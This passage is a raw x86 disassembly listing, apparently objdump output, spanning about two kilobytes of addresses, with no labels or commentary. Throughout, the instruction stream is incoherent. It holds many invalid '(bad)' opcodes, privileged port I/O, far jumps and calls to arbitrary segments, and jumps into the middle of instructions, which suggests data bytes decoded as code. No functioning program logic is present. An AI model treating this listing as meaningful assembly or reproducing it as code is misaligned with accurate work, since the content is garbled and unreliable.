  4114fb:	cmp    DWORD PTR [ebp+0x1b695580],0x91b5759b
  411505:	ret    
  411506:	cli    
  411507:	(bad)  
  411508:	in     eax,0x32
  41150a:	push   esi
  41150b:	and    bh,BYTE PTR [edi]
  41150d:	jmp    0x4114cb
  41150f:	sbb    eax,0xef129176
  411514:	mov    edx,0x231a46d8
  411519:	push   edx
  41151a:	test   eax,0x2214a713
  41151f:	(bad)
  411522:	int3   
  411523:	jns    0x411531
  411525:	and    BYTE PTR [esi+ebx*8],dh
  411528:	pusha  
  411529:	popf   
  41152a:	pop    ds
  41152b:	mov    edi,0x37539bd6
  411530:	inc    ecx
  411531:	jbe    0x4114eb
  411533:	mov    bh,ch
  411535:	mov    gs,WORD PTR [ecx+0x38c4dd0c]
  41153b:	adc    BYTE PTR [edi+0x32aeb9d7],ch
  411541:	sbb    BYTE PTR [edx],dl
  411543:	dec    BYTE PTR [edx+0x68]
  411546:	push   esi
  411547:	cmp    eax,0x69d39193
  41154c:	jecxz  0x41151b
  41154e:	cmp    BYTE PTR [esi+0x1d],0xb5
  411552:	push   ecx
  411553:	lods   eax,DWORD PTR ds:[esi]
  411554:	sub    DWORD PTR [eax],edi
  411556:	cmp    ah,BYTE PTR [ebp+0xafdd728]
  41155c:	sbb    bh,BYTE PTR [ebx]
  41155e:	mov    esp,0xbb650e61
  411563:	aad    0x1c
  411565:	ins    BYTE PTR es:[edi],dx
  411566:	dec    ecx
  411567:	dec    edi
  411568:	or     ecx,DWORD PTR [ebx+eax*8-0x1]
  41156c:	aad    0xf2
  41156e:	pop    edi
  41156f:	test   eax,0xefcdff6b
  411574:	xor    ah,al
  411576:	popf   
  411577:	lea    ebx,[eax+eiz*4-0x49]
  41157b:	adc    BYTE PTR [edi+ebp*8],dh
  41157e:	shl    DWORD PTR [esi],0xdb
  411581:	add    cl,BYTE PTR [edi-0x749370e]
  411587:	mov    bl,0x1d
  411589:	sbb    DWORD PTR [ebx-0xfb962d4],0xf6d285ab
  411593:	bound  esp,QWORD PTR [ebx+0x42]
  411596:	dec    esp
  411597:	ficom  DWORD PTR fs:[ebx-0x6d]
  41159b:	xor    ah,bh
  41159d:	popa   
  41159e:	inc    edx
  41159f:	dec    edx
  4115a0:	icebp  
  4115a1:	ss ret 0x62b5
  4115a5:	loop   0x4115be
  4115a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115a8:	dec    ebp
  4115a9:	inc    ebp
  4115aa:	call   0x7502ae77
  4115af:	inc    esi
  4115b0:	mov    gs,WORD PTR [esi-0x28161bcc]
  4115b6:	xchg   ebx,eax
  4115b7:	add    al,0x4
  4115b9:	or     dl,al
  4115bb:	mov    ebx,0x1ffca187
  4115c0:	stos   BYTE PTR es:[edi],al
  4115c1:	lods   eax,DWORD PTR ds:[esi]
  4115c2:	test   al,0xd3
  4115c4:	mov    al,0xb1
  4115c6:	(bad)  
  4115c7:	sbb    eax,0x7a3eb024
  4115cc:	adc    DWORD PTR [edx-0x4c],edx
  4115cf:	loopne 0x41162f
  4115d1:	add    BYTE PTR [ebx+0xf],dh
  4115d4:	ja     0x4115e9
  4115d6:	sar    bh,0x56
  4115d9:	fcmovb st,st(0)
  4115db:	mov    al,ds:0xb70e1bf5
  4115e0:	mov    ds:0x8765d84f,eax
  4115e5:	fndisi(8087 only) 
  4115e7:	sub    cl,BYTE PTR [edi]
  4115e9:	jp     0x411653
  4115eb:	jmp    0x411609
  4115ed:	pusha  
  4115ee:	out    0xc2,al
  4115f0:	(bad)  
  4115f1:	fcmovne st,st(1)
  4115f3:	mov    eax,0x7a24d74a
  4115f8:	ja     0x411633
  4115fa:	xlat   BYTE PTR ds:[ebx]
  4115fb:	sbb    bh,BYTE PTR [ebp-0x27]
  4115fe:	sbb    eax,eax
  411600:	mov    ecx,0x33411d98
  411605:	sub    ah,BYTE PTR [ebx+esi*8-0x48d15665]
  41160c:	or     al,0x5
  41160e:	pop    esi
  41160f:	push   cs
  411610:	xchg   BYTE PTR [eax],dl
  411612:	sbb    dl,dl
  411614:	xor    edi,DWORD PTR [ebp+edx*2-0x53a195c5]
  41161b:	pop    edi
  41161c:	cmp    eax,0xc4494e6e
  411621:	xor    al,0x91
  411623:	(bad)  
  411624:	cwde   
  411625:	scas   eax,DWORD PTR es:[edi]
  411626:	sbb    al,0x63
  411628:	fld    QWORD PTR [ebp+0x34]
  41162b:	inc    edi
  41162c:	pop    ecx
  41162d:	cs xchg ecx,eax
  41162f:	mov    BYTE PTR [eax+0x55],dh
  411632:	xchg   ebx,ebx
  411634:	jmp    0x7d68:0xca63ba7b
  41163b:	fild   QWORD PTR [eax+0x2e56b093]
  411641:	cwde   
  411642:	add    eax,0x3ece0f39
  411647:	int    0xf7
  411649:	fld    TBYTE PTR [ebp+0x4b]
  41164c:	cmp    al,0xe6
  41164e:	sbb    BYTE PTR [edi+0x2096913d],ah
  411654:	jbe    0x41160e
  411656:	jecxz  0x411618
  411658:	or     DWORD PTR [ebp-0x6151b9ad],eax
  41165e:	sub    bh,BYTE PTR [edi+0x75]
  411661:	pop    ds
  411662:	ficomp WORD PTR [ecx]
  411664:	jo     0x4115ff
  411666:	rcl    DWORD PTR [ecx-0x1c6a3f00],0x92
  41166d:	int3   
  41166e:	push   0xed17f62f
  411673:	inc    edi
  411674:	push   0x20
  411676:	into   
  411677:	call   0x712028da
  41167c:	jmp    0x411663
  41167e:	in     eax,dx
  41167f:	pop    ds
  411680:	jmp    0x27a20b82
  411685:	inc    edx
  411686:	mov    ecx,0x55fcfb7
  41168b:	bound  esi,QWORD PTR [esp+eax*2]
  41168e:	xchg   ecx,eax
  41168f:	adc    esi,DWORD PTR [edi+0x6c]
  411692:	aam    0xc5
  411694:	lds    ebx,FWORD PTR [ebx+eax*2+0x73]
  411698:	pop    edx
  411699:	repnz xchg edi,eax
  41169b:	xchg   DWORD PTR [ecx],ecx
  41169d:	(bad)  [esi-0x78]
  4116a0:	sub    ebx,ebp
  4116a2:	jmp    0x13973066
  4116a7:	jae    0x411631
  4116a9:	push   ecx
  4116aa:	fld    DWORD PTR [esi]
  4116ac:	fild   WORD PTR [eax+edx*1-0x5]
  4116b0:	gs xchg ebp,eax
  4116b2:	and    ch,BYTE PTR [ecx+0x7b]
  4116b5:	adc    eax,0x8c0a4cc1
  4116ba:	mov    ecx,eax
  4116bc:	add    eax,0xec6e94fb
  4116c1:	jmp    eax
  4116c3:	xor    eax,0x18df8bd0
  4116c8:	sar    DWORD PTR [esp+ebx*4+0x3c1180e4],0xf1
  4116d0:	int3   
  4116d1:	pushf  
  4116d2:	hlt    
  4116d3:	cmp    edi,DWORD PTR ds:0xce9531d8
  4116d9:	and    eax,0x860c8101
  4116de:	lea    edx,[edi-0x27abe451]
  4116e4:	out    0x59,eax
  4116e6:	dec    esp
  4116e7:	nop
  4116e8:	rcr    BYTE PTR [esi],0xdc
  4116eb:	in     al,dx
  4116ec:	jge    0x411740
  4116ee:	icebp  
  4116ef:	push   esi
  4116f0:	fcom   QWORD PTR [ebp-0x27774f53]
  4116f6:	out    dx,al
  4116f7:	rcr    DWORD PTR [edx],cl
  4116f9:	cli    
  4116fa:	jge    0x411746
  4116fc:	add    esp,DWORD PTR [ebp+0x473d1e9b]
  411702:	gs mov ebx,0x7e24f451
  411708:	iret   
  411709:	sbb    eax,0x78e74bfb
  41170e:	mov    ebx,0x304a634a
  411713:	nop
  411714:	outs   dx,DWORD PTR ds:[esi]
  411715:	mov    cl,0xbd
  411717:	push   cs
  411718:	xchg   DWORD PTR [edx+0x3c],edi
  41171b:	(bad)  
  41171c:	call   0xcc715eda
  411721:	mov    ecx,0x7ea68336
  411726:	and    BYTE PTR [ebp+0x49],0x18
  41172a:	rcr    DWORD PTR [ebx],0x3f
  41172d:	mov    ds:0x227a3754,al
  411732:	loop   0x41175a
  411734:	lods   eax,DWORD PTR ds:[esi]
  411735:	push   es
  411736:	repnz mov ebp,0xd673afe2
  41173c:	push   ebp
  41173d:	pushf  
  41173e:	lods   al,BYTE PTR ds:[esi]
  41173f:	shl    BYTE PTR [ebx],1
  411741:	jge    0x4116dd
  411743:	jg     0x41174e
  411745:	adc    bl,BYTE PTR [ebx]
  411747:	xor    DWORD PTR [ebx],ebp
  411749:	or     DWORD PTR [ebx],0xb5eabc3c
  41174f:	jne    0x4116ec
  411751:	mov    dl,0x50
  411753:	inc    esp
  411754:	cmp    DWORD PTR [edx+0x7e],ebp
  411757:	mov    eax,ds:0x59683d
  41175c:	enter  0x431e,0x28
  411760:	dec    edx
  411761:	dec    esi
  411762:	push   ss
  411763:	pushf  
  411764:	jle    0x411735
  411766:	mov    ebp,0xdafdd91d
  41176b:	(bad)  
  41176c:	in     eax,dx
  41176d:	sub    DWORD PTR [edx+0x66f63a39],edx
  411773:	add    DWORD PTR [ebp-0x2195b8c1],ecx
  411779:	push   edi
  41177a:	push   DWORD PTR [ebx]
  41177c:	jmp    0x4117c3
  41177e:	jle    0x411744
  411780:	mov    fs:0xce46d2ef,al
  411786:	(bad)  
  411787:	dec    edi
  411788:	add    eax,0xd247dedc
  41178d:	adc    eax,0x79b0ce62
  411792:	loop   0x411791
  411794:	fs test al,0xad
  411797:	pushf  
  411798:	(bad)  [ebp-0x2c]
  41179b:	sbb    eax,ebp
  41179d:	pop    ebx
  41179e:	cmp    BYTE PTR [ecx+ebx*2],ch
  4117a1:	iret   
  4117a2:	push   edi
  4117a3:	lds    edx,FWORD PTR [edi]
  4117a5:	dec    eax
  4117a6:	xor    ebp,ebx
  4117a8:	pop    ss
  4117a9:	mov    BYTE PTR [esi+0x3e9fcae4],ah
  4117af:	popf   
  4117b0:	xor    bl,bl
  4117b2:	repnz push ebp
  4117b4:	xor    BYTE PTR [ebx-0x36],cl
  4117b7:	(bad)  [ebx+ecx*8+0x4]
  4117bb:	xchg   BYTE PTR [ecx+0x1f998701],al
  4117c1:	inc    ebp
  4117c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117c4:	adc    DWORD PTR [ebx-0x2aa58e8d],edx
  4117ca:	mov    esp,0x6b139549
  4117cf:	js     0x4117e8
  4117d1:	sub    BYTE PTR [bp+0x2f38],cl
  4117d6:	das    
  4117d7:	mov    dl,0xc1
  4117d9:	jno    0x411836
  4117db:	jmp    0xfed1:0x4a84d2ad
  4117e2:	iret   
  4117e3:	lods   al,BYTE PTR ds:[esi]
  4117e4:	pop    edi
  4117e5:	push   es
  4117e6:	cli    
  4117e7:	mov    dh,0x13
  4117e9:	sub    al,0xe2
  4117eb:	not    DWORD PTR [edi+0x721de3ec]
  4117f1:	ds clc 
  4117f3:	fsubp  st(2),st
  4117f5:	(bad)  
  4117f6:	jnp    0x4117e4
  4117f8:	dec    eax
  4117f9:	push   0x5478824c
  4117fe:	lods   eax,DWORD PTR ds:[esi]
  4117ff:	mov    ds:0x78783fab,eax
  411804:	sbb    bh,bl
  411806:	mov    dl,0x2f
  411808:	add    BYTE PTR [ebx],ah
  41180a:	daa    
  41180b:	pushf  
  41180c:	or     esp,DWORD PTR [eax+0x10]
  41180f:	inc    ebx
  411810:	hlt    
  411811:	cdq    
  411812:	dec    ebp
  411813:	jecxz  0x41187c
  411815:	scas   al,BYTE PTR es:[edi]
  411816:	fst    DWORD PTR [edi+0x58e72d3f]
  41181c:	rcl    BYTE PTR [ebp-0x3b],0xca
  411820:	imul   ecx,DWORD PTR ds:0xfd5e7016,0xed0969a9
  41182a:	push   edx
  41182b:	sbb    ah,BYTE PTR [eax-0x455f8189]
  411831:	or     ax,0xd14e
  411835:	popf   
  411836:	mov    bh,0xf2
  411838:	call   FWORD PTR [edx-0x7d]
  41183b:	pop    ebx
  41183c:	and    bh,BYTE PTR [edx-0x5382c996]
  411842:	nop
  411843:	lock cmp eax,0x618817d9
  411849:	or     ecx,DWORD PTR [edi]
  41184b:	call   0x29102837
  411850:	retf   0x1c0f
  411853:	repz adc al,0xf3
  411856:	rcl    DWORD PTR [edx],1
  411858:	(bad)  
  411859:	fcmovnb st,st(0)
  41185b:	sbb    eax,DWORD PTR [edx+0x2ba1a02b]
  411861:	push   esi
  411862:	stos   BYTE PTR es:[edi],al
  411863:	out    0x3,eax
  411865:	cmp    esp,ebx
  411867:	sahf   
  411868:	ja     0x41186d
  41186a:	jmp    0xce4c:0x98152159
  411871:	sbb    ebx,DWORD PTR [ecx-0x4bd2203a]
  411877:	add    edi,DWORD PTR [ebx]
  411879:	mov    ds:0xce129761,eax
  41187e:	sahf   
  41187f:	sub    BYTE PTR [ecx+0x70],bl
  411882:	mov    dl,0x24
  411884:	and    ebx,eax
  411886:	push   0xdf5583f0
  41188b:	push   esi
  41188c:	pop    edx
  41188d:	gs inc ebx
  41188f:	shr    BYTE PTR [esi],1
  411891:	ins    BYTE PTR es:[edi],dx
  411892:	pop    ecx
  411893:	dec    ebp
  411894:	jo     0x41187b
  411896:	and    esp,DWORD PTR [ebp-0x370cac63]
  41189c:	lea    esi,[ecx]
  41189e:	adc    edi,edx
  4118a0:	adc    BYTE PTR [edi],bh
  4118a2:	mov    ecx,0x49d158a0
  4118a7:	pop    ds
  4118a8:	iret   
  4118a9:	(bad)
  4118ac:	xor    eax,0x96fba4c8
  4118b1:	jmp    0xc34:0xcdf8d7cc
  4118b8:	fnsave [ebx+0x4702cd1c]
  4118be:	pop    es
  4118bf:	(bad)  
  4118c0:	mov    gs,WORD PTR [esi+eax*1]
  4118c3:	push   0x824403ab
  4118c8:	mov    esi,0x72fdf562
  4118cd:	or     bh,ah
  4118cf:	(bad)  
  4118d0:	and    DWORD PTR ds:0x47df10ea,ecx
  4118d6:	shr    DWORD PTR ds:0xc2c0c054,0xae
  4118dd:	mov    al,0x93
  4118df:	jne    0x4118e5
  4118e1:	mov    ds:0xc8e39c9,al
  4118e6:	adc    ebx,DWORD PTR [esi*8+0x2bd97d0b]
  4118ed:	lea    esp,[si+0xe52]
  4118f2:	pop    edi
  4118f3:	add    BYTE PTR [ecx],bh
  4118f5:	sbb    ebx,ecx
  4118f7:	mov    cl,0xfa
  4118f9:	mov    esp,0xfa19566b
  4118fe:	mov    edx,cs
  411900:	or     eax,0x7bcf8499
  411905:	xor    eax,0xcc9569a3
  41190a:	pop    ebx
  41190b:	ret    
  41190c:	stc    
  41190d:	retf   0xa7ec
  411910:	lea    ecx,[edx]
  411912:	pop    ds
  411913:	cmp    al,0x4b
  411915:	dec    ebp
  411916:	div    DWORD PTR ds:[edi-0x39]
  41191a:	sub    BYTE PTR [edi],bh
  41191c:	shl    BYTE PTR [ebx+edi*2-0x2d],cl
  411920:	xor    BYTE PTR [ebp+ebx*4+0x56],dh
  411924:	sbb    BYTE PTR [esi],bh
  411926:	cmp    al,0xdd
  411928:	lahf   
  411929:	dec    ebx
  41192a:	cmp    eax,0x8a9097e1
  41192f:	test   eax,0x9a9c9813
  411934:	xlat   BYTE PTR ds:[ebx]
  411935:	popf   
  411936:	push   ds
  411937:	(bad)  
  411938:	jmp    0x8381f01b
  41193d:	xor    dh,BYTE PTR [esi+0x56ddbbbe]
  411943:	fld    QWORD PTR [esi]
  411945:	push   esi
  411946:	push   esp
  411947:	mov    ch,0x79
  411949:	push   0x773d2b1d
  41194e:	or     DWORD PTR [edx+0x54],esp
  411951:	lock jmp 0x4119aa
  411954:	or     eax,0xf8565e66
  411959:	(bad)  
  41195a:	xchg   edx,eax
  41195b:	mov    BYTE PTR [ecx-0x10517354],0xc3
  411962:	out    dx,al
  411963:	icebp  
  411964:	mov    gs,WORD PTR [edi]
  411966:	outs   dx,DWORD PTR ds:[esi]
  411967:	pop    esi
  411968:	xor    bh,0x3a
  41196b:	or     DWORD PTR [edx-0x5],0xf78df06f
  411972:	je     0x41192e
  411974:	out    dx,eax
  411975:	sub    DWORD PTR [esi],ebp
  411977:	push   ds
  411978:	jecxz  0x41195b
  41197a:	jnp    0x411986
  41197c:	sbb    eax,0xd3f69263
  411981:	test   BYTE PTR [ebp+0x8],dl
  411984:	and    al,0x5a
  411986:	inc    edx
  411987:	scas   al,BYTE PTR es:[edi]
  411988:	xchg   esp,eax
  411989:	test   eax,0x98af3890
  41198e:	adc    BYTE PTR [esi],0x50
  411991:	nop
  411992:	(bad)  
  411993:	std    
  411994:	mov    ch,0x1
  411996:	imul   ebx,DWORD PTR ds:0x788dda7e,0x73
  41199d:	es sti 
  41199f:	sub    eax,0x876928aa
  4119a4:	push   eax
  4119a5:	inc    ecx
  4119a6:	leave  
  4119a7:	jns    0x41196b
  4119a9:	stos   DWORD PTR es:[edi],eax
  4119aa:	dec    eax
  4119ab:	xchg   BYTE PTR ds:0x165c0105,cl
  4119b1:	dec    esp
  4119b2:	fnstsw WORD PTR [edx]
  4119b4:	push   esp
  4119b5:	cdq    
  4119b6:	xchg   edi,eax
  4119b7:	call   0x90c6:0x400899b8
  4119be:	mov    ds:0x37c9ae6f,al
  4119c3:	mov    dh,0xdd
  4119c5:	std    
  4119c6:	repz ldmxcsr DWORD PTR [edx+edi*8]
  4119cb:	sbb    esp,edx
  4119cd:	ja     0x411a33
  4119cf:	out    0xfe,eax
  4119d1:	dec    esp
  4119d2:	mov    ecx,0x77250c38
  4119d7:	test   eax,0x931026d
  4119dc:	cwde   
  4119dd:	push   ds
  4119de:	mov    ah,0xc0
  4119e0:	retf   0x6af3
  4119e3:	(bad)  
  4119e4:	cmp    eax,0x8353d316
  4119e9:	and    cl,bh
  4119eb:	mov    ch,0xa7
  4119ed:	and    DWORD PTR [ecx-0x14],ebx
  4119f0:	aad    0xd2
  4119f2:	mov    bl,0x75
  4119f4:	cmp    al,0xa5
  4119f6:	jnp    0x411a59
  4119f8:	pop    edx
  4119f9:	out    dx,al
  4119fa:	lock sar DWORD PTR [ebx-0x7ba04c2f],1
  411a01:	cdq    
  411a02:	out    dx,al
  411a03:	sub    edi,edx
  411a05:	in     eax,dx
  411a06:	test   BYTE PTR [eax],dl
  411a08:	(bad)  
  411a09:	(bad)  
  411a0a:	pusha  
  411a0b:	xchg   ebx,eax
  411a0c:	jg     0x4119e3
  411a0e:	jnp    0x411a7d
  411a10:	sbb    al,0xf5
  411a12:	inc    eax
  411a13:	sub    BYTE PTR [edx+0x16],0xb
  411a17:	sbb    eax,0x3b9cdded
  411a1c:	ficomp WORD PTR [eax]
  411a1e:	loope  0x4119fa
  411a20:	xchg   edi,eax
  411a21:	call   0xc4f6:0x11228eda
  411a28:	add    eax,0x6b723fd4
  411a2d:	adc    DWORD PTR [edx-0x72],edx
  411a30:	jbe    0x411a4c
  411a32:	sub    BYTE PTR [edi],ah
  411a34:	inc    ebx
  411a35:	xor    edx,DWORD PTR ds:0xb4293de4
  411a3b:	outs   dx,DWORD PTR ds:[esi]
  411a3c:	xor    ebx,DWORD PTR ds:0xf8168dac
  411a42:	and    DWORD PTR [ecx],ebx
  411a44:	mov    ecx,0x9f5fe298
  411a49:	adc    DWORD PTR [esp+eiz*8+0x791c0929],0xd8d5c9d3
  411a54:	adc    eax,0x8e45b35a
  411a59:	lahf   
  411a5a:	ins    BYTE PTR es:[edi],dx
  411a5b:	jae    0x411a50
  411a5d:	fadd   st(1),st
  411a5f:	push   eax
  411a60:	mov    edx,0x66b6a282
  411a65:	xor    al,0xf5
  411a67:	popf   
  411a68:	push   0x32
  411a6a:	(bad)  
  411a6c:	add    eax,0xb777d094
  411a71:	test   al,0x69
  411a73:	lds    edx,FWORD PTR [ebp-0x25]
  411a76:	mov    eax,ds:0x2a9d2ba4
  411a7b:	les    eax,FWORD PTR [edi+edi*1]
  411a7e:	push   0x32eb92f7
  411a83:	test   BYTE PTR [ecx+0x1a],ch
  411a86:	icebp  
  411a87:	test   al,0x61
  411a89:	clc    
  411a8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a8b:	mov    cl,0x91
  411a8d:	add    BYTE PTR [esi-0x1de5f536],dh
  411a93:	fist   DWORD PTR ds:0x15d3039e
  411a99:	push   esi
  411a9a:	cdq    
  411a9b:	push   edx
  411a9c:	push   esi
  411a9d:	popa   
  411a9e:	jmp    0x411a21
  411aa0:	lock and al,0xa1
  411aa3:	repnz aas 
  411aa5:	add    BYTE PTR [ebx+ebp*2],dl
  411aa8:	shr    dh,cl
  411aaa:	mov    DWORD PTR [ebx],esp
  411aac:	mov    al,0xb6
  411aae:	and    eax,0xf50e5f1b
  411ab3:	xchg   edx,eax
  411ab4:	iret   
  411ab5:	sbb    al,0xb4
  411ab7:	adc    DWORD PTR [edi+0x19216cc8],ebx
  411abd:	sub    cl,BYTE PTR [ecx-0x5e]
  411ac0:	(bad)  
  411ac1:	jmp    0x8646:0x308c1a5b
  411ac8:	ds push ebp
  411aca:	and    bh,BYTE PTR ds:0xf286cab2
  411ad0:	mov    ecx,0x19c5df69
  411ad5:	xchg   ebx,eax
  411ad6:	cs out dx,eax
  411ad8:	sub    eax,0x6656eb9b
  411add:	jno    0x411b33
  411adf:	mov    ds:0x8747e089,eax
  411ae4:	jg     0x411b12
  411ae6:	jbe    0x411b34
  411ae8:	jmp    DWORD PTR [ebx-0x6730e348]
  411aee:	arpl   WORD PTR [ebx-0x50],bp
  411af1:	cmp    edx,DWORD PTR fs:[ebx*2-0x41ae1d91]
  411af9:	das    
  411afa:	push   eax
  411afb:	push   0x57
  411afd:	pop    ds
  411afe:	inc    edx
  411aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b00:	add    dh,bh
  411b02:	ja     0x411b6f
  411b04:	jo     0x411ae5
  411b06:	ret    0x35e
  411b09:	jno    0x411b03
  411b0b:	jle    0x411afa
  411b0d:	sti    
  411b0e:	pop    ds
  411b0f:	enter  0x810d,0x14
  411b13:	jle    0x411b86
  411b15:	fwait
  411b16:	mov    esp,0xb5e69ca
  411b1b:	(bad)  
  411b1d:	or     BYTE PTR [ecx],dl
  411b1f:	iret   
  411b20:	or     eax,0x2581db45
  411b25:	mov    ebp,0xaebfe84d
  411b2a:	imul   ebp,DWORD PTR [ebx],0xc7bcc243
  411b30:	fld    QWORD PTR [eax]
  411b32:	imul   BYTE PTR [edi]
  411b34:	hlt    
  411b35:	dec    ebp
  411b36:	pusha  
  411b37:	add    DWORD PTR [ebp+0x3a],edx
  411b3a:	sub    eax,0x9435795d
  411b3f:	adc    BYTE PTR [ecx-0x2c],bl
  411b42:	ror    DWORD PTR [esi+0x11],cl
  411b45:	ret    
  411b46:	stos   DWORD PTR es:[edi],eax
  411b47:	(bad)  
  411b48:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b4a:	cmp    al,0x8d
  411b4c:	fdiv   QWORD PTR [edx+0x5aa9705c]
  411b52:	stc    
  411b53:	cld    
  411b54:	inc    edi
  411b55:	mov    ds:0x2baae23c,eax
  411b5a:	das    
  411b5b:	pop    es
  411b5c:	(bad)  
  411b5d:	imul   edi,DWORD PTR [ecx-0x22caa8fd],0x2eb2c72f
  411b67:	test   BYTE PTR [eax+0x4],dl
  411b6a:	dec    esp
  411b6b:	and    eax,0xbabb57b7
  411b70:	xchg   ecx,eax
  411b71:	xor    BYTE PTR [esi],ah
  411b73:	shl    BYTE PTR [edi],0x7b
  411b76:	jl     0x411b5b
  411b78:	imul   edi,DWORD PTR [edx+esi*1+0x0],0xb6caddd7
  411b80:	daa    
  411b81:	and    eax,0xc17ef522
  411b86:	jmp    0x4dc79467
  411b8b:	pop    edx
  411b8c:	repnz repz int3 
  411b8f:	outs   dx,BYTE PTR ds:[esi]
  411b90:	mov    ds:0x980e049c,eax
  411b95:	mov    ?,ebp
  411b97:	xchg   edi,eax
  411b98:	loope  0x411b2e
  411b9a:	jns    0x411bc5
  411b9c:	call   0x92c0:0xe54b42a5
  411ba3:	das    
  411ba4:	cs jecxz 0x411bf7
  411ba7:	inc    ecx
  411ba8:	fmul   DWORD PTR [ebx]
  411baa:	adc    esp,DWORD PTR [ecx+0x7833771f]
  411bb0:	mov    edx,0xb316062
  411bb5:	call   0x566a6ce6
  411bba:	ja     0x411c21
  411bbc:	dec    edi
  411bbd:	push   es
  411bbe:	sbb    BYTE PTR [ebx-0x5a],al
  411bc1:	adc    al,0x3c
  411bc3:	sub    DWORD PTR cs:[eax+0x4052079],eax
  411bca:	xchg   esp,eax
  411bcb:	enter  0x5dab,0xb3
  411bcf:	jne    0x411ba3
  411bd1:	adc    BYTE PTR [esi+0x62],0xe3
  411bd5:	hlt    
  411bd6:	scas   eax,DWORD PTR es:[edi]
  411bd7:	mov    bl,ah
  411bd9:	xor    bl,BYTE PTR cs:[ebx]
  411bdc:	in     al,dx
  411bdd:	imul   edi,DWORD PTR [esi+0x6f],0x49e8d7c6
  411be4:	in     eax,0xab
  411be6:	popa   
  411be7:	fdiv   st(5),st
  411be9:	std    
  411bea:	and    eax,0xa111f5b6
  411bef:	es dec edx
  411bf1:	test   al,0xa5
  411bf3:	push   ecx
  411bf4:	push   edx
  411bf5:	call   0x5bcd1271
  411bfa:	fdivr  QWORD PTR [ecx]
  411bfc:	(bad)  
  411bfd:	shr    DWORD PTR ds:0xfdc7ac9a,cl
  411c03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c04:	pop    esi
  411c05:	xchg   esi,eax
  411c06:	cdq    
  411c07:	cs xchg esp,eax
  411c09:	and    eax,0x248ec69a
  411c0e:	ins    DWORD PTR es:[edi],dx
  411c0f:	js     0x411bfd
  411c11:	push   eax
  411c12:	scas   eax,DWORD PTR es:[edi]
  411c13:	cli    
  411c14:	addr16 mov ah,ah
  411c17:	jp     0x411bbc
  411c19:	repz pop edi
  411c1b:	sahf   
  411c1c:	mov    ah,0x4a
  411c1e:	mov    BYTE PTR [ecx-0x3a706ec3],cl
  411c24:	cs mov ch,0x8c
  411c27:	mov    bh,0xd0
  411c29:	push   ebx
  411c2a:	add    ebp,DWORD PTR [esi]
  411c2c:	(bad)  
  411c2d:	bound  ebp,QWORD PTR [ebx-0x5df4ef4a]
  411c33:	inc    esp
  411c34:	in     eax,dx
  411c35:	push   esi
  411c36:	aad    0x99
  411c38:	push   es
  411c39:	in     eax,0xdb
  411c3b:	mov    ds:0x26aebe5b,al
  411c40:	push   edi
  411c41:	push   0xd87513b1
  411c46:	sub    DWORD PTR [edx-0x75698c37],ebx
  411c4c:	adc    bh,ch
  411c4e:	sub    esi,edx
  411c50:	mov    bh,0x80
  411c52:	int    0xaf
  411c54:	ror    DWORD PTR [ebp-0x45],0xe5
  411c58:	pop    es
  411c59:	out    0xbd,al
  411c5b:	jg     0x411c80
  411c5d:	loop   0x411c46
  411c5f:	fmul   QWORD PTR [eax]
  411c61:	mov    ds:0x95312a7a,al
  411c66:	push   ecx
  411c67:	and    al,0xf2
  411c69:	mov    al,0xe7
  411c6b:	pop    edi
  411c6c:	ins    DWORD PTR es:[edi],dx
  411c6d:	sub    edi,DWORD PTR [edx+0x49]
  411c70:	call   0x876f:0x4cd41249
  411c77:	push   0xbb938640
  411c7c:	cdq    
  411c7d:	push   esi
  411c7e:	dec    edx
  411c7f:	pushf  
  411c80:	aam    0xeb
  411c82:	jp     0x411cd4
  411c84:	sub    dh,BYTE PTR [ebx]
  411c86:	loop   0x411cbb
  411c88:	push   esp
  411c89:	push   edx
  411c8a:	pop    ss
  411c8b:	lds    edx,FWORD PTR [ebx-0x26]
  411c8e:	mov    ds:0x33b13273,eax
  411c93:	jne    0x411ca7
  411c95:	into   
  411c96:	mov    esp,0x92139bc7
  411c9b:	out    0xb7,eax
  411c9d:	psrlq  mm3,mm3
  411ca0:	out    dx,eax
  411ca1:	mov    dl,0x22
  411ca3:	mov    eax,ds:0xa8423088
  411ca8:	inc    edx
  411ca9:	lds    ebp,FWORD PTR ds:0x1616e69
  411caf:	cdq    
  411cb0:	mov    ds:0x7d620b9d,al
  411cb5:	mov    ds:0x46eca607,al
  411cba:	fdiv   st,st(7)
  411cbc:	daa    
  411cbd:	push   ebx
  411cbe:	fcmovnbe st,st(6)
  411cc0:	mov    esi,DWORD PTR [eax-0x32]
  411cc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cc4:	cmp    DWORD PTR [eax],edi
  411cc6:	scas   al,BYTE PTR es:[edi]
  411cc7:	call   0xcf26:0x5a1fbc10
  411cce:	aas    
  411ccf:	mov    al,ds:0xe4bebc31
  411cd4:	xchg   edx,eax
  411cd5:	in     al,0x87
  411cd7:	lsl    eax,WORD PTR ds:0x4dd9535d
  411cde:	xor    BYTE PTR [edx-0x4d],dh
  411ce1:	push   edi
  411ce2:	loopne 0x411cf3
  411ce4:	inc    ebx
  411ce5:	push   esp
  411ce6:	or     ebp,0x6a5bbac6
  411cec:	push   ebx
  411ced:	mov    ecx,0xb7b45fed
  411cf2:	or     eax,eax
  411cf4:	mov    bh,0x93
  411cf6:	mov    dl,0xc
  411cf8:	xchg   ecx,edx
  411cfa:	ror    BYTE PTR [ecx-0x106f403a],cl
  411d00:	aam    0x66
  411d02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d03:	push   0xbd32a70f
  411d08:	xchg   esi,eax
  411d09:	(bad)  
  411d0a:	or     eax,0x1f693a07
  411d0f:	xchg   esi,eax
  411d10:	xchg   esi,eax
  411d11:	imul   esp,edi,0xfffffffa
  411d14:	fbld   TBYTE PTR [esi+0x151dee8a]
  411d1a:	dec    esp
  411d1b:	jmp    0xcc95d88
  411d20:	ds or  eax,0x9528e95f
  411d26:	call   FWORD PTR [ebp+0x1aae1132]
  411d2c:	jp     0x411cc5
  411d2e:	sar    BYTE PTR [edi+0x43625d09],0x7d
  411d35:	mov    dl,0xda
  411d37:	addr16 (bad) 
  411d39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
